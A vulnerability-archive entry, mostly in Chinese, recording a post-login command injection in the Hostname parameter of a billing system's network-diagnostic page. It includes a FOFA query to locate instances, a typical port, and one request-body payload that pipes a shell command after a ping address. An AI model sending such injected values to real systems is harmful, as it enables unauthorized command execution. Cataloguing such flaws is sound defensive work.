---
source: "MrWQ/vulnerability-paper"
title: "蓝海卓越计费管理系统 后台网络诊断Hostname命令注入"
product: "蓝海卓越计费管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，文称网络接口不存在才可拼接，6070仅常见端口"
prerequisites: "后台登录"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/Q2ltToW0qOyU1YVkeXWgyw"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%90%8E%E5%8F%B0%20RCE%20%E6%BC%8F%E6%B4%9E.md"
id: "vw-c7efb303e4263d898475b951"
entity_id: "ve-c7efb303e4263d898475b951"
schema_version: "1"
---

# 蓝海卓越计费管理系统 后台网络诊断Hostname命令注入

## 条目说明

- 对象与具体问题：蓝海卓越计费管理系统；后台网络诊断Hostname命令注入
- 版本、配置及部署条件：版本未知，文称网络接口不存在才可拼接，6070仅常见端口
- 认证与权限前提：后台登录
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与debug.php不同诊断入口，不能按产品+RCE去重
- 只有body无请求路由/方法，关键源码和返回都在未视检图
- 接口不存在疑指物理网卡非HTTP接口，术语需澄清；端口不作为影响条件
- 大量文库推广与授权公告，应去噪保留来源；缺修复/版本

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Q2ltToW0qOyU1YVkeXWgyw)

**1、描述**

  

蓝海卓越计费管理系统公网已经爆出两个漏洞，任意文件读取和远程命令执行，本次为后台 RCE 漏洞。

  

  

  

  

  

**2、影响范围**

  

蓝海卓越计费管理系统

  

  

  

  

  

**3、FOFA**

  

app="蓝海卓越计费管理系统"

  

  

  

  

  

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/vLkXic8TjvxFkZWhz8hicaaDGkF9d7WiaYaOR6oLKHSJ709cLb17NsVDPnLI22YbRibaic33YMUZ5goMxia9UEaw7hRg/640?wx_fmt=gif)

漏洞复现

漏洞存在点很简单，就是没有对输入的过滤  

![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvticDYCtBFYa1YkU6QvdphRVMXyibDEyEYoCWe6aS9tkZXP4D22mYY0kw/640?wx_fmt=jpeg)

执行拼接代码执行，这里有个点需要注意以下，就是接口不能存在，才能进行拼接，当接口不存在的时候，接口调用为空，则后面可以进行拼接

![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvUhmjhsOdtTomSyj32scdp467lSQ67CYxDRCtichpdDc2eciahynPQpYA/640?wx_fmt=jpeg)

无任何其他的过滤操作![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvejE2BygosicYyRXgsGRsobH31HuDltFKchDYiarPX691pupaJPAwd1Zw/640?wx_fmt=jpeg)

端口一般开在 6070

```
Hostname=114.114.114.114|ls -la&physicalInterface=1&pingCount=1
```

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvo3UAgEfx6saXCvicoicEH8maKiabesOzngKQiaptyYckKt6YryQauzCGbA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvkHItOVFudcYH6cP5xj9ealddJrYxtAh70TH8dswqpmEiauHBazb9Y6g/640?wx_fmt=png)

           ![](https://mmbiz.qpic.cn/mmbiz/yqVAqoZvDibF4Yt2FQ7OXEVdYnmw5luVibtn7s5Xgo37kJ8QS8Yv3TocRISibmUrXAGf0s3gTia1reAGvbW3x6O0kw/640?wx_fmt=gif)          

漏洞文库：wiki.xypbk.com

免费授权已发放完毕，以后不定期发放授权。  
如有特殊需要请留言，或提交一篇自挖或公网未流出漏洞，即可获取授权  
如需投稿请后台回复 "投稿" 获取微信，添加微信后直接发送漏洞文章即可。

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvA2Ntxt26WvGNlCsCXRvk9Kt0yCcWcdvky3rWb15jtJ2kew624gWW1A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCv2txz7VW0vB277NOaHD18qM5f4lSW5MoHSIdNmnhwFzh9Vq3JlibIB1g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvuRz1qDSFibSggh7Mj4vdgXXzAKC78oSbexuTjCBGUHLpQPF7UPCZANQ/640?wx_fmt=png)

    本站开设的起因是因为某一次 HW，查漏洞真的太麻烦了，就想起来做了一个站点，本意就是自己用来快速检索漏洞详情的，为了方便大家就公开了，但是这样就又会被不法份子利用，和影响一些大佬的权益。  

    为防止黑产份子的非法利用漏洞，不给国家安全添麻烦，本站从此开启授权访问。

    如若因漏洞利用产生重大影响，会根据登录 IP、请求内容、申请授权等信息进行查证，查证后将对号主进行追责，故不要分享账号，终害己身。  

    虽然比较麻烦了些，但会稍微对黑产份子有一些限制，保证了本站安全，也保证国家安全。同时有些敏感东西也能第一时间放出来了，还请大家谅解。

    同时本站承诺永远不会出现买卖账号等利益相关的事情，本站永不割韭菜，永久免费检索，坚决抵制安全圈的歪风邪气。

    最后，若大家对此有意见请后台留言，本站将及时改正，若内容有侵犯您的权益，请及时提出，进行删除处理。  

    本站能坚持多久全看大家是否滥用，内容若更新较慢也请谅解，本人有工作有生活，会尽量坚持更新的。

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8Yzhia63knJ4QJFvO4WBfd6KQazjtuPC7uqNBt5gE06ia7GjOVn2RFOicNA/640?wx_fmt=jpeg)

扫取二维码获取

更多精彩

![](https://mmbiz.qpic.cn/mmbiz_png/TlgiajQKAFPtOYY6tXbF7PrWicaKzENbNF71FLc4vO5nrH2oxBYwErfAHKg2fD520niaCfYbRnPU6teczcpiaH5DKA/640?wx_fmt=png)

Qingy 之安全  

![](https://mmbiz.qpic.cn/mmbiz_png/Y8TRQVNlpCW6icC4vu5Pl5JWXPyWdYvGAyfVstVJJvibaT4gWn3Mc0yqMQtWpmzrxibqciazAr5Yuibwib5wILBINfuQ/640?wx_fmt=png)

                                   ![](https://mmbiz.qpic.cn/mmbiz_gif/nMQkaGYuOibDxhica5PCFc53hQ1NxSibkCvwcmL5Lb7OCb4UibtoT1ATGNwpSlJjCQM2dKHqeW9XpalKgocYvNIeibw/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/3pKe8enqDsSibzOy1GzZBhppv9xkibfYXeOiaiaA8qRV6QNITSsAebXibwSVQnwRib6a2T4M8Xfn3MTwTv1PNnsWKoaw/640?wx_fmt=png)

点个在看你最好看

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
